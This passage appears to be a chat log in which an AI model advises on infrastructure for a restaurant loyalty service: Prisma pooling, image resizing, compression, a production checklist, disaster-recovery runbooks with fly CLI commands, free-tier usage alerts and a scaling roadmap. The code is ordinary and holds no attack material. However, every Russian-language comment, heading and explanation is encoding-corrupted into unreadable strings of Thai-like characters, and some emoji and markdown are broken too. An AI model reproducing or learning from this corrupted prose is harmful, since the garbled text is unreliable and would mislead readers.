# pool_timeout=20       - ะะดัะผ 20 ัะตะบัะฝะด ัะฒะพะฑะพะดะฝะพะณะพ ัะพะตะดะธะฝะตะฝะธั
# connect_timeout=10    - ะขะฐะนะผะฐัั ะฟะพะดะบะปััะตะฝะธั ะบ ะะ 10 ัะตะบัะฝะด
```

**Neon.tech connection pooling (Pgbouncer):**

```bash
# Neon ะฟัะตะดะพััะฐะฒะปัะตั 2 URL:
# 1. Pooled connection (ัะตัะตะท Pgbouncer)
DATABASE_URL="postgresql://user:pass@pooler.neon.tech:5432/db"

# 2. Direct connection (ะดะปั ะผะธะณัะฐัะธะน)
DIRECT_DATABASE_URL="postgresql://user:pass@neon.tech:5432/db"
```

**prisma/schema.prisma:**

```prisma
datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")           // Pooled ะดะปั runtime
  directUrl = env("DIRECT_DATABASE_URL")   // Direct ะดะปั ะผะธะณัะฐัะธะน
}
```


***

### **2๏ธโฃ9๏ธโฃ Image optimization: ะะฐะบ ะพะฟัะธะผะธะทะธัะพะฒะฐัั ะทะฐะณััะทะบั ะปะพะณะพัะธะฟะพะฒ/ะฐะฒะฐัะฐัะพะฒ?**

**ะะะะะะก:** ะะพะณะพัะธะฟั ัะตััะพัะฐะฝะพะฒ ะธ ะฐะฒะฐัะฐัั ะณะพััะตะน - ะบะฐะบ ะพะฟัะธะผะธะทะธัะพะฒะฐัั?

**ะะะ ะะะจะะะะ (Cloudflare R2 + Images CDN):**

```typescript
// apps/backend/src/storage/image.service.ts
import { Injectable } from '@nestjs/common';
import { S3Service } from './s3.service';
import sharp from 'sharp';
import { v4 as uuidv4 } from 'uuid';

@Injectable()
export class ImageService {
  constructor(private s3: S3Service) {}

  async uploadAndOptimize(
    file: Express.Multer.File,
    folder: 'logos' | 'avatars' | 'cards',
  ): Promise<string> {
    const fileId = uuidv4();
    const formats = ['webp', 'png']; // WebP ะดะปั modern browsers, PNG fallback

    // ะะฟัะตะดะตะปัะตะผ ัะฐะทะผะตัั ะฟะพ ัะธะฟั
    const sizes = this.getSizes(folder);

    const uploadPromises = [];

    for (const size of sizes) {
      for (const format of formats) {
        const optimized = await sharp(file.buffer)
          .resize(size.width, size.height, {
            fit: 'cover',
            position: 'center',
          })
          .toFormat(format as any, {
            quality: format === 'webp' ? 85 : 90,
          })
          .toBuffer();

        const key = `${folder}/${fileId}-${size.suffix}.${format}`;
        
        uploadPromises.push(
          this.s3.uploadBuffer(optimized, key, {
            contentType: `image/${format}`,
            cacheControl: 'public, max-age=31536000, immutable',
          }),
        );
      }
    }

    await Promise.all(uploadPromises);

    // ะะพะทะฒัะฐัะฐะตะผ URL ะฑะตะท ัะฐััะธัะตะฝะธั (CDN ัะฐะผ ะฟะพะดะฑะตััั ัะพัะผะฐั)
    return `https://cdn.max-loyalty.com/${folder}/${fileId}`;
  }

  private getSizes(folder: string) {
    switch (folder) {
      case 'logos':
        return [
          { width: 200, height: 200, suffix: 'thumb' },
          { width: 500, height: 500, suffix: 'medium' },
          { width: 1000, height: 1000, suffix: 'large' },
        ];
      case 'avatars':
        return [
          { width: 50, height: 50, suffix: 'xs' },
          { width: 100, height: 100, suffix: 'sm' },
          { width: 200, height: 200, suffix: 'md' },
        ];
      case 'cards':
        return [
          { width: 400, height: 250, suffix: 'mobile' },
          { width: 800, height: 500, suffix: 'desktop' },
        ];
    }
  }
}
```

**Cloudflare Workers ะดะปั on-the-fly resizing:**

```typescript
// cloudflare-workers/image-resize.ts
export default {
  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);
    const pathname = url.pathname;

    // Parse request: /logos/uuid-thumb.webp?w=300
    const match = pathname.match(/^\/(\w+)\/([\w-]+)-(thumb|medium|large)\.(webp|png)$/);
    
    if (!match) {
      return new Response('Invalid image URL', { status: 400 });
    }

    const [, folder, fileId, size, format] = match;
    const requestedWidth = url.searchParams.get('w');

    // Fetch from R2
    const r2Url = `https://r2.max-loyalty.com/${folder}/${fileId}-${size}.${format}`;
    let response = await fetch(r2Url);

    // On-the-fly resize ะตัะปะธ ะฝัะถะตะฝ custom ัะฐะทะผะตั
    if (requestedWidth && response.ok) {
      const imageBuffer = await response.arrayBuffer();
      
      // ะัะฟะพะปัะทัะตะผ Cloudflare Image Resizing (ะฟะปะฐัะฝะฐั ัะธัะฐ)
      // ะะปะธ ะฒะพะทะฒัะฐัะฐะตะผ ะบะฐะบ ะตััั ะฝะฐ free tier
    }

    // Cache ะฝะฐ ะณะพะด
    return new Response(response.body, {
      headers: {
        'Content-Type': `image/${format}`,
        'Cache-Control': 'public, max-age=31536000, immutable',
        'CDN-Cache-Control': 'max-age=31536000',
      },
    });
  },
};
```

**Frontend usage:**

```tsx
// Responsive image ั fallback
<picture>
  <source
    srcSet={`${logoUrl}-thumb.webp 200w, ${logoUrl}-medium.webp 500w`}
    type="image/webp"
  />
  <source
    srcSet={`${logoUrl}-thumb.png 200w, ${logoUrl}-medium.png 500w`}
    type="image/png"
  />
  <img src={`${logoUrl}-medium.png`} alt="Restaurant logo" />
</picture>
```


***

### **3๏ธโฃ0๏ธโฃ API Response compression: Gzip ะธะปะธ Brotli?**

**ะะะะะะก:** ะกะถะธะผะฐัั ะปะธ API responses ะธ ะบะฐะบะธะผ ะฐะปะณะพัะธัะผะพะผ?

**ะะะ ะะะจะะะะ: Brotli (ะตัะปะธ ะฑัะฐัะทะตั ะฟะพะดะดะตัะถะธะฒะฐะตั) + Gzip fallback**

```typescript
// apps/backend/src/main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import * as compression from 'compression';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Compression middleware
  app.use(
    compression({
      filter: (req, res) => {
        // ะะต ัะถะธะผะฐะตะผ ะตัะปะธ ัะถะต ัะถะฐัะพ ะธะปะธ ะตัะปะธ ััะพ stream
        if (req.headers['x-no-compression']) {
          return false;
        }
        return compression.filter(req, res);
      },
      threshold: 1024, // ะกะถะธะผะฐะตะผ ัะพะปัะบะพ ะตัะปะธ > 1 KB
      level: 6, // ะะพะผะฟัะพะผะธัั ะผะตะถะดั ัะบะพัะพัััั ะธ ััะตะฟะตะฝัั ัะถะฐัะธั (1-9)
    }),
  );

  await app.listen(3000);
}
bootstrap();
```

**Cloudflare ะฐะฒัะพะผะฐัะธัะตัะบะธ ะฟัะธะผะตะฝัะตั Brotli:**

- โ ะะปั ััะฐัะธัะตัะบะธั ัะฐะนะปะพะฒ (JS, CSS, HTML)
- โ ะะปั API responses (ะตัะปะธ `Accept-Encoding: br`)
- โ Brotli ะดะฐัั ~20% ะปัััะต ัะถะฐัะธะต ัะตะผ Gzip

**ะงัะพ ัะถะธะผะฐะตััั:**

```
JSON response 50 KB โ 5-10 KB (Brotli)
HTML page 100 KB โ 15-20 KB (Brotli)
JS bundle 500 KB โ 120-150 KB (Brotli)
```

**ะะต ัะถะธะผะฐะตะผ:**

- โ ะะทะพะฑัะฐะถะตะฝะธั (ัะถะต ัะถะฐัั)
- โ ะะธะดะตะพ
- โ ะฃะถะต ัะถะฐััะต ัะฐะนะปั (.zip, .gz)

***

## ๐ฏ **ะะะะ 6: PRODUCTION READINESS (5 ะฒะพะฟัะพัะพะฒ)**

### **3๏ธโฃ1๏ธโฃ Production checklist: ะงัะพ ะฟัะพะฒะตัะธัั ะฟะตัะตะด ะทะฐะฟััะบะพะผ?**

**ะะะ ะะะะะซะ CHECKLIST:**

```markdown
# ๐ PRODUCTION READINESS CHECKLIST

## ๐ SECURITY
- [ ] ะัะต secrets ะฒ Fly.io secrets (ะฝะต ะฒ git)
- [ ] JWT_SECRET ะผะธะฝะธะผัะผ 32 ัะธะผะฒะพะปะฐ (random)
- [ ] ENCRYPTION_KEY ะดะปั ะะ ัะธััะพะฒะฐะฝะธั
- [ ] Rate limiting ะฒะบะปััะตะฝ (Cloudflare + Backend)
- [ ] CORS ะฝะฐัััะพะตะฝ ัะพะปัะบะพ ะดะปั ัะฒะพะธั ะดะพะผะตะฝะพะฒ
- [ ] HTTPS ะพะฑัะทะฐัะตะปะตะฝ (force redirect)
- [ ] Security headers (helmet.js)
- [ ] SQL injection ะทะฐัะธัะฐ (Prisma ORM)
- [ ] XSS ะทะฐัะธัะฐ (input sanitization)
- [ ] CSRF tokens ะดะปั ัะพัะผ
- [ ] Content Security Policy (CSP)
- [ ] API keys encrypted ะฒ ะะ
- [ ] No sensitive data ะฒ ะปะพะณะฐั

## ๐๏ธ DATABASE
- [ ] ะัะต migrations ะฟัะธะผะตะฝะตะฝั
- [ ] Indexes ัะพะทะดะฐะฝั (ัะผ. ะฒะพะฟัะพั 26)
- [ ] Connection pooling ะฝะฐัััะพะตะฝ
- [ ] Backups ะฐะฒัะพะผะฐัะธัะตัะบะธะต (Neon.tech + S3)
- [ ] Slow query monitoring ะฒะบะปััะตะฝ
- [ ] pg_stat_statements extension ะฒะบะปัััะฝ
- [ ] Database size monitoring
- [ ] Connection limit < 100

## ๐ MONITORING & LOGGING
- [ ] Better Stack ะฟะพะดะบะปัััะฝ
- [ ] Uptime monitors ะฝะฐัััะพะตะฝั
- [ ] Alert rules ะฝะฐัััะพะตะฝั (Telegram)
- [ ] Error tracking ัะฐะฑะพัะฐะตั
- [ ] Structured JSON logs
- [ ] No PII ะฒ ะปะพะณะฐั
- [ ] Log retention 30 ะดะฝะตะน
- [ ] Business metrics tracking

## ๐ CI/CD
- [ ] GitHub Actions workflow ัะฐะฑะพัะฐะตั
- [ ] Tests ะฟัะพัะพะดัั (unit + integration)
- [ ] Linting ะฒะบะปัััะฝ
- [ ] Type checking ะฒะบะปัััะฝ
- [ ] Automated deploys ะฝะฐ main branch
- [ ] Rollback plan ะณะพัะพะฒ

## ๐ INFRASTRUCTURE
- [ ] Fly.io VM ะทะฐะฟััะตะฝั (3 VM: API, Worker, Cron)
- [ ] Health checks ะฟัะพัะพะดัั
- [ ] Graceful shutdown ะฝะฐัััะพะตะฝ
- [ ] Zero-downtime deploys
- [ ] Custom domain ะฝะฐัััะพะตะฝ
- [ ] SSL certificate ัะฐะฑะพัะฐะตั
- [ ] CDN ะฝะฐัััะพะตะฝ (Cloudflare)
- [ ] DNS records ะฟัะฐะฒะธะปัะฝัะต

## ๐ฐ BILLING & LIMITS
- [ ] Subscription webhook handlers ัะฐะฑะพัะฐัั
- [ ] Tenant limits ะฟัะพะฒะตัััััั
- [ ] Restricted mode ะดะปั ะฝะตะพะฟะปะฐัะตะฝะฝัั
- [ ] Payment retry logic ัะฐะฑะพัะฐะตั
- [ ] Invoice generation ัะฐะฑะพัะฐะตั
- [ ] Refund logic ะณะพัะพะฒ

## ๐ง EXTERNAL SERVICES
- [ ] Email service ัะฐะฑะพัะฐะตั (Resend)
- [ ] SMS provider ะฝะฐัััะพะตะฝ (SMS.RU)
- [ ] S3 storage ัะฐะฑะพัะฐะตั (Cloudflare R2)
- [ ] Redis ะดะพัััะฟะตะฝ (Upstash)
- [ ] POS webhooks ะฒะฐะปะธะดะธัััััั (HMAC)
- [ ] Payment provider webhooks ัะฐะฑะพัะฐัั

## ๐งช TESTING
- [ ] Load testing ะฟัะพะนะดะตะฝ (k6)
- [ ] API endpoints ะฒัะต ะฟัะพัะตััะธัะพะฒะฐะฝั
- [ ] Critical flows ัะฐะฑะพัะฐัั (E2E)
- [ ] Error scenarios ะพะฑัะฐะฑะพัะฐะฝั
- [ ] Edge cases ะฟะพะบัััั

## ๐ฑ TELEGRAM BOT
- [ ] Bot ะทะฐัะตะณะธัััะธัะพะฒะฐะฝ (@BotFather)
- [ ] Webhook ะฝะฐัััะพะตะฝ
- [ ] Commands ัะฐะฑะพัะฐัั
- [ ] Mini App ะพัะบััะฒะฐะตััั
- [ ] Notifications ะพัะฟัะฐะฒะปััััั

## ๐ DOCUMENTATION
- [ ] API documentation (Swagger)
- [ ] README.md ะฐะบััะฐะปะตะฝ
- [ ] Environment variables ะทะฐะดะพะบัะผะตะฝัะธัะพะฒะฐะฝั
- [ ] Runbook ะดะปั incidents
- [ ] Architecture diagram ะณะพัะพะฒ

## ๐ง OPERATIONAL
- [ ] On-call rotation setup
- [ ] Incident response plan
- [ ] Backup restore ะฟัะพัะตััะธัะพะฒะฐะฝ
- [ ] Database migration rollback ะฟะปะฐะฝ
- [ ] Status page (ะตัะปะธ ะฝัะถะตะฝ)
```

**Automated checks script:**

```typescript
// scripts/production-checklist.ts
import { PrismaClient } from '@prisma/client';
import Redis from 'ioredis';
import axios from 'axios';

async function runChecks() {
  console.log('๐ Running production readiness checks...\n');

  const results = {
    passed: 0,
    failed: 0,
    warnings: 0,
  };

  // Check 1: Database connection
  try {
    const prisma = new PrismaClient();
    await prisma.$connect();
    console.log('โ Database connection');
    results.passed++;
    await prisma.$disconnect();
  } catch (error) {
    console.error('โ Database connection failed:', error.message);
    results.failed++;
  }

  // Check 2: Redis connection
  try {
    const redis = new Redis(process.env.REDIS_URL);
    await redis.ping();
    console.log('โ Redis connection');
    results.passed++;
    redis.disconnect();
  } catch (error) {
    console.error('โ Redis connection failed:', error.message);
    results.failed++;
  }

  // Check 3: API health endpoint
  try {
    const response = await axios.get('https://api.max-loyalty.com/health');
    if (response.data.status === 'ok') {
      console.log('โ API health check');
      results.passed++;
    } else {
      throw new Error('Health check returned non-ok status');
    }
  } catch (error) {
    console.error('โ API health check failed:', error.message);
    results.failed++;
  }

  // Check 4: Required environment variables
  const requiredEnvVars = [
    'DATABASE_URL',
    'REDIS_URL',
    'JWT_SECRET',
    'ENCRYPTION_KEY',
    'RESEND_API_KEY',
    'SMS_RU_API_KEY',
    'BETTER_STACK_TOKEN',
  ];

  for (const envVar of requiredEnvVars) {
    if (process.env[envVar]) {
      console.log(`โ ${envVar} set`);
      results.passed++;
    } else {
      console.error(`โ ${envVar} not set`);
      results.failed++;
    }
  }

  // Check 5: JWT secret strength
  if (process.env.JWT_SECRET && process.env.JWT_SECRET.length < 32) {
    console.warn('โ๏ธ JWT_SECRET should be at least 32 characters');
    results.warnings++;
  } else {
    console.log('โ JWT_SECRET strength');
    results.passed++;
  }

  // Summary
  console.log(`\n๐ Summary:`);
  console.log(`   โ Passed: ${results.passed}`);
  console.log(`   โ Failed: ${results.failed}`);
  console.log(`   โ๏ธ Warnings: ${results.warnings}`);

  if (results.failed > 0) {
    console.error('\nโ Production readiness check FAILED');
    process.exit(1);
  } else {
    console.log('\nโ Production readiness check PASSED');
    process.exit(0);
  }
}

runChecks();
```

**ะ GitHub Actions:**

```yaml
- name: Production readiness check
  run: npm run check:production
  env:
    DATABASE_URL: ${{ secrets.DATABASE_URL }}
    REDIS_URL: ${{ secrets.REDIS_URL }}
    # ...
```


***

### **3๏ธโฃ2๏ธโฃ Disaster recovery plan: ะงัะพ ะดะตะปะฐัั ะตัะปะธ ะฒัั ัะฟะฐะปะพ?**

**ะะะะะะก:** ะกัะตะฝะฐัะธะธ ะฐะฒะฐัะธะน ะธ ะบะฐะบ ะฒะพัััะฐะฝะฐะฒะปะธะฒะฐัั?

**ะะะ DISASTER RECOVERY PLAYBOOK:**

```markdown
# ๐ DISASTER RECOVERY PLAYBOOK

## ๐ด SCENARIO 1: Backend API Down

### Detection:
- Better Stack alert: "Backend API down for 2 minutes"
- HTTP 503 errors
- Telegram ะฐะปะตัั

### Diagnosis:
1. Check Fly.io status page: https://status.fly.io/
2. Check VM status: `fly status -a max-loyalty-prod`
3. Check logs: `fly logs -a max-loyalty-prod`

### Recovery:
```bash
# Option A: Restart VMs
fly apps restart max-loyalty-prod

# Option B: Redeploy last working version
fly releases -a max-loyalty-prod
fly deploy --image-ref <previous-image>

# Option C: Rollback deployment
fly releases -a max-loyalty-prod
fly rollback -a max-loyalty-prod --version <previous-version>
```


### Verification:

```bash
curl https://api.max-loyalty.com/health
# Expected: {"status":"ok"}
```


### ETA: 5 minutes


---

## ๐ SCENARIO 2: Database Connection Loss

### Detection:

- Prisma errors: "Can't reach database server"
- Health check failing on /health endpoint


### Diagnosis:

```bash
# Check Neon.tech status
curl https://neon.tech/api/v2/projects/<project-id>/status

# Test connection manually
psql $DATABASE_URL -c "SELECT 1"
```


### Recovery:

```bash
# Option A: Restart connection pool
fly apps restart max-loyalty-prod

# Option B: Switch to backup database (if exists)
fly secrets set DATABASE_URL="<backup-db-url>"
fly apps restart max-loyalty-prod

# Option C: Restore from backup
neon branches create --from main --timestamp "1 hour ago"
fly secrets set DATABASE_URL="<new-branch-url>"
```


### ETA: 10-15 minutes


---

## ๐ก SCENARIO 3: Redis Down (Upstash)

### Detection:

- Redis connection errors
- Rate limiting not working
- Sessions not persisting


### Impact: LOW (app ัะฐะฑะพัะฐะตั, ะฝะพ degraded)

### Recovery:

```bash
# Redis ะฝะต ะบัะธัะธัะตะฝ, app ะฟัะพะดะพะปะถะธั ัะฐะฑะพัะฐัั
# ะัะพััะพ ะผะพะฝะธัะพัะธะผ Upstash status: https://status.upstash.com/

# ะัะปะธ ะดะพะปะณะพ ะฝะต ะฒะพัััะฐะฝะฐะฒะปะธะฒะฐะตััั, ะฟะตัะตะบะปััะฐะตะผัั ะฝะฐ fallback
fly secrets set REDIS_URL="redis://alternative-provider"
fly apps restart max-loyalty-prod
```


### ETA: 5 minutes (ะธะปะธ ะถะดัะผ Upstash ะฒะพัััะฐะฝะพะฒะปะตะฝะธั)


---

## ๐ด SCENARIO 4: Data Loss / Accidental Delete

### Detection:

- ะะพะปัะทะพะฒะฐัะตะปั ัะพะพะฑัะฐะตั: "ะัะต ะผะพะธ ะณะพััะธ ะฟัะพะฟะฐะปะธ!"
- Audit logs ะฟะพะบะฐะทัะฒะฐัั ะผะฐััะพะฒะพะต ัะดะฐะปะตะฝะธะต


### Recovery:

```bash
# 1. STOP ะฒัะต ะพะฟะตัะฐัะธะธ ะทะฐะฟะธัะธ
fly scale count 0 -a max-loyalty-prod

# 2. ะะฟัะตะดะตะปัะตะผ ะฒัะตะผั ะธะฝัะธะดะตะฝัะฐ
# 3. ะะพัััะฐะฝะฐะฒะปะธะฒะฐะตะผ ะธะท Neon.tech point-in-time backup
neon branches create \
  --from main \
  --timestamp "2026-02-12T14:00:00Z" \
  --name "recovery-feb12"

# 4. ะะพะดะบะปััะฐะตะผ recovered ะะ
NEW_DB_URL=$(neon connection-string recovery-feb12)
fly secrets set DATABASE_URL="$NEW_DB_URL"

# 5. ะะตััะฐัััะตะผ
fly scale count 3 -a max-loyalty-prod

# 6. ะัะพะฒะตััะตะผ ะดะฐะฝะฝัะต
psql $NEW_DB_URL -c "SELECT COUNT(*) FROM \"Guest\""
```


### ETA: 20-30 minutes


---

## ๐ SCENARIO 5: S3 Storage Unavailable (Cloudflare R2)

### Detection:

- ะัะธะฑะบะธ ะทะฐะณััะทะบะธ ะปะพะณะพัะธะฟะพะฒ
- "Failed to upload image" ะฒ ะปะพะณะฐั


### Impact: MEDIUM (app ัะฐะฑะพัะฐะตั, ะฝะพ ะฝะตะปัะทั ะทะฐะณััะทะธัั ัะฐะนะปั)

### Recovery:

```bash
# Cloudflare R2 ะพัะตะฝั ััะฐะฑะธะปะตะฝ, ะฝะพ ะตัะปะธ ะฟัะพะฑะปะตะผะฐ:

# Option A: Switch to backup bucket
fly secrets set \
  S3_BUCKET="max-loyalty-backup" \
  S3_ENDPOINT="https://backup.r2.cloudflarestorage.com"

# Option B: Switch to alternative provider (Backblaze B2)
fly secrets set \
  S3_ENDPOINT="https://s3.us-west-002.backblazeb2.com" \
  S3_BUCKET="max-loyalty" \
  S3_ACCESS_KEY="..." \
  S3_SECRET_KEY="..."
```


### ETA: 10 minutes


---

## ๐ด SCENARIO 6: Complete Platform Outage (Fly.io Down)

### Detection:

- ะัะต VM ะฝะตะดะพัััะฟะฝั
- Fly.io status page shows incident


### Recovery:

```bash
# ะัััััะน ะฟะตัะตะฝะพั ะฝะฐ Render.com ะธะปะธ Railway

# 1. Deploy ะฝะฐ backup provider (ะฟัะตะดะฒะฐัะธัะตะปัะฝะพ ะฝะฐัััะพะตะฝ)
git push render main  # ะธะปะธ railway up

# 2. Update DNS (Cloudflare)
# api.max-loyalty.com โ ะฝะพะฒัะน ะฟัะพะฒะฐะนะดะตั

# 3. ะฃะฒะตะดะพะผะธัั ะฟะพะปัะทะพะฒะฐัะตะปะตะน ะฒ Telegram
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" \
  -d "chat_id=@max_loyalty_announcements" \
  -d "text=๐จ ะัะพะฒะพะดัััั ัะตัะฝะธัะตัะบะธะต ัะฐะฑะพัั. ะกะตัะฒะธั ัะบะพัะพ ะฒะพัััะฐะฝะพะฒะธััั."
```


### ETA: 30-60 minutes


---

## ๐ ESCALATION

### Level 1: Automated alerts โ Telegram

### Level 2: On-call engineer (you)

### Level 3: Vendor support (Fly.io, Neon.tech)

### Contacts:

- Fly.io support: support@fly.io
- Neon.tech support: support@neon.tech
- Cloudflare support: enterprise support (ะฟะปะฐัะฝัะน)

```

***

### **3๏ธโฃ3๏ธโฃ Cost optimization: ะะฐะบ ัะปะพะถะธัััั ะฒ ะฑะตัะฟะปะฐัะฝัะต ะปะธะผะธัั?**

**ะะะะะะก:** ะกะปะตะดะธัั ะทะฐ usage ะธ ะฝะต ะฟัะตะฒััะฐัั free tier ะปะธะผะธัั?

**ะะะ ะะะจะะะะ: Usage tracking dashboard**

```typescript
// apps/backend/src/monitoring/usage-tracking.service.ts
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { PrismaService } from '@/database/prisma.service';
import { RedisService } from '@/redis/redis.service';
import { LoggerService } from '@/logging/logger.service';

interface UsageStats {
  // Fly.io
  fly: {
    vm_hours: number;
    bandwidth_gb: number;
    storage_gb: number;
  };
  
  // Neon.tech
  neon: {
    storage_gb: number;
    compute_hours: number;
  };
  
  // Upstash Redis
  upstash: {
    commands_today: number;
    storage_mb: number;
  };
  
  // Cloudflare R2
  r2: {
    storage_gb: number;
    requests_count: number;
  };
  
  // Vercel
  vercel: {
    bandwidth_gb: number;
    functions_executions: number;
  };
  
  // GitHub Actions
  github: {
    minutes_used: number;
  };
}

@Injectable()
export class UsageTrackingService {
  constructor(
    private prisma: PrismaService,
    private redis: RedisService,
    private logger: LoggerService,
  ) {}

  @Cron(CronExpression.EVERY_DAY_AT_MIDNIGHT)
  async trackDailyUsage() {
    const stats = await this.collectUsageStats();
    
    // Save to database
    await this.prisma.usageSnapshot.create({
      data: {
        date: new Date(),
        stats: stats as any,
      },
    });

    // Check limits
    await this.checkLimits(stats);
  }

  private async collectUsageStats(): Promise<UsageStats> {
    return {
      fly: await this.getFlyUsage(),
      neon: await this.getNeonUsage(),
      upstash: await this.getUpstashUsage(),
      r2: await this.getR2Usage(),
      vercel: await this.getVercelUsage(),
      github: await this.getGitHubUsage(),
    };
  }

  private async getFlyUsage() {
    // API call to Fly.io
    // GET https://api.fly.io/v1/apps/max-loyalty-prod/metrics
    return {
      vm_hours: 0, // Calculate from uptime
      bandwidth_gb: 0,
      storage_gb: 3,
    };
  }

  private async getUpstashUsage() {
    // ะกัะธัะฐะตะผ commands ะทะฐ ัะตะณะพะดะฝั
    const key = `usage:redis:${new Date().toISOString().split('T')[0]}`;
    const commands = await this.redis.get(key);
    
    return {
      commands_today: parseInt(commands || '0'),
      storage_mb: 0, // ะะท Upstash dashboard API
    };
  }

  private async checkLimits(stats: UsageStats) {
    const alerts = [];

    // Upstash Redis: 10,000 commands/ะดะตะฝั
    if (stats.upstash.commands_today > 8000) {
      alerts.push({
        service: 'Upstash Redis',
        metric: 'Commands',
        current: stats.upstash.commands_today,
        limit: 10000,
        percentage: (stats.upstash.commands_today / 10000) * 100,
      });
    }

    // Neon.tech: 3 GB storage
    if (stats.neon.storage_gb > 2.5) {
      alerts.push({
        service: 'Neon.tech',
        metric: 'Storage',
        current: stats.neon.storage_gb,
        limit: 3,
        percentage: (stats.neon.storage_gb / 3) * 100,
      });
    }

    // Cloudflare R2: 10 GB storage
    if (stats.r2.storage_gb > 8) {
      alerts.push({
        service: 'Cloudflare R2',
        metric: 'Storage',
        current: stats.r2.storage_gb,
        limit: 10,
        percentage: (stats.r2.storage_gb / 10) * 100,
      });
    }

    // Vercel: 100 GB bandwidth
    if (stats.vercel.bandwidth_gb > 80) {
      alerts.push({
        service: 'Vercel',
        metric: 'Bandwidth',
        current: stats.vercel.bandwidth_gb,
        limit: 100,
        percentage: (stats.vercel.bandwidth_gb / 100) * 100,
      });
    }

    // GitHub Actions: 2000 minutes
    if (stats.github.minutes_used > 1600) {
      alerts.push({
        service: 'GitHub Actions',
        metric: 'Minutes',
        current: stats.github.minutes_used,
        limit: 2000,
        percentage: (stats.github.minutes_used / 2000) * 100,
      });
    }

    // Send alerts if > 80% usage
    if (alerts.length > 0) {
      await this.sendUsageAlerts(alerts);
    }
  }

  private async sendUsageAlerts(alerts: any[]) {
    for (const alert of alerts) {
      if (alert.percentage > 90) {
        // CRITICAL: > 90%
        this.logger.error('โ๏ธ CRITICAL: Usage limit approaching', alert);
        // Send Telegram notification
      } else if (alert.percentage > 80) {
        // WARNING: 80-90%
        this.logger.warn('โ๏ธ WARNING: High usage detected', alert);
      }
    }
  }
}
```

**Telegram alert:**

```
โ๏ธ WARNING: Usage Limit Alert

Service: Upstash Redis
Metric: Commands per day
Current: 8,500 / 10,000 (85%)

Action: Consider optimizing cache usage or upgrading plan.
```


***

ะัะพะดะพะปะถะธัั ั ะฟะพัะปะตะดะฝะธะผะธ 2 ะฒะพะฟัะพัะฐะผะธ (scaling strategy + final summary)? ๐ฏ

---

# ะฟัะพะดะพะปะถะธ

ะัะพะดะพะปะถะฐั ั ะฟะพัะปะตะดะฝะธะผะธ ะฒะพะฟัะพัะฐะผะธ! ๐

***

### **3๏ธโฃ4๏ธโฃ Scaling strategy: ะะพะณะดะฐ ะธ ะบะฐะบ ะฟะตัะตัะพะดะธัั ั free tier ะฝะฐ ะฟะปะฐัะฝัะน?**

**ะะะะะะก:** ะะฐะบ ะฟะพะฝััั ััะพ ะฟะพัะฐ ะผะฐัััะฐะฑะธัะพะฒะฐัััั ะธ ััะพ ัะปัััะฐัั ะฟะตัะฒัะผ?

**ะะะ SCALING ROADMAP:**

```markdown
# ๐ SCALING MILESTONES & UPGRADE PATH

## ๐ข MILESTONE 1: MVP Launch (0-500 ะณะพััะตะน)
**Current free tier ะดะพััะฐัะพัะฝะพ:**
- Fly.io: 3 VM ร 256 MB
- Neon.tech: 3 GB storage
- Upstash: 10,000 commands/ะดะตะฝั
- Vercel: 100 GB bandwidth
- R2: 10 GB storage

**ะกัะพะธะผะพััั: $0/ะผะตััั**
**Capacity:**
- 500 ะณะพััะตะน
- 5,000 ััะฐะฝะทะฐะบัะธะน/ะผะตััั
- 10-20 concurrent users

---

## ๐ก MILESTONE 2: First Paying Tenants (500-2,000 ะณะพััะตะน)
**Bottlenecks ะฝะฐัะธะฝะฐัั ะฟะพัะฒะปััััั:**

### ะะตัะฒะฐั ะฟัะพะฑะปะตะผะฐ: RAM ะฝะฐ Fly.io VM
**ะกะธะผะฟัะพะผั:**
- Memory usage > 90%
- Slow response times
- OOM (Out of Memory) crashes

**Upgrade #1: Fly.io VM RAM** (ะะะะะะะขะะข 1)
```bash
# Upgrade API VM: 256 MB โ 512 MB
fly scale memory 512 -a max-loyalty-prod --process api

# Cost: $5-10/ะผะตััั
```


### ะัะพัะฐั ะฟัะพะฑะปะตะผะฐ: Database storage

**ะกะธะผะฟัะพะผั:**

- Neon warning: "2.8 GB / 3 GB used"

**Upgrade \#2: Neon.tech storage** (ะะะะะะะขะะข 2)

```bash
# Scale plan: Launch (free) โ Scale ($19/ะผะตััั)
# - 10 GB storage
# - 100 compute hours
# - Point-in-time recovery 30 days
```

**ะกัะพะธะผะพััั: ~\$30/ะผะตััั**
**Capacity:**

- 2,000 ะณะพััะตะน
- 20,000 ััะฐะฝะทะฐะบัะธะน/ะผะตััั
- 50-100 concurrent users

---

## ๐ MILESTONE 3: Product-Market Fit (2,000-10,000 ะณะพััะตะน)

**ะัะถะฝะพ ะผะฐัััะฐะฑะธัะพะฒะฐัั ะธะฝััะฐััััะบัััั:**

### Upgrade \#3: Multiple Fly.io VMs (Horizontal scaling)

```bash
# Scale API: 1 VM โ 3 VMs
fly scale count 3 --process api

# Auto-scaling rules
fly autoscale set api \
  --min 2 \
  --max 5 \
  --metric concurrency=200

# Cost: $20-40/ะผะตััั
```


### Upgrade \#4: Redis capacity (Upstash Pro)

**ะกะธะผะฟัะพะผั:**

- Hitting 10,000 commands/ะดะตะฝั
- Need more cache storage

```bash
# Upstash Pro plan
# - 100,000 commands/ะดะตะฝั
# - 1 GB storage
# - Cost: $10/ะผะตััั
```


### Upgrade \#5: CDN Cloudflare Pro

**ะะฐัะตะผ:**

- Advanced caching rules
- Better WAF
- Image optimization
- Cost: \$20/ะผะตััั

**ะกัะพะธะผะพััั: ~\$90/ะผะตััั**
**Capacity:**

- 10,000 ะณะพััะตะน
- 100,000 ััะฐะฝะทะฐะบัะธะน/ะผะตััั
- 200-500 concurrent users

---

## ๐ด MILESTONE 4: Scale Up (10,000-50,000 ะณะพััะตะน)

**ะะตัะตัะพะด ะฝะฐ dedicated infrastructure:**

### Upgrade \#6: Dedicated Database (Neon Business)

```bash
# Neon Business: $69/ะผะตััั
# - 50 GB storage
# - Dedicated compute
# - Read replicas
# - 7-day PITR
```


### Upgrade \#7: Separate infrastructure zones

```
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ   Zone 1: EU (Frankfurt)            โ
โ   - Backend API cluster             โ
โ   - PostgreSQL primary              โ
โ   - Redis primary                   โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ

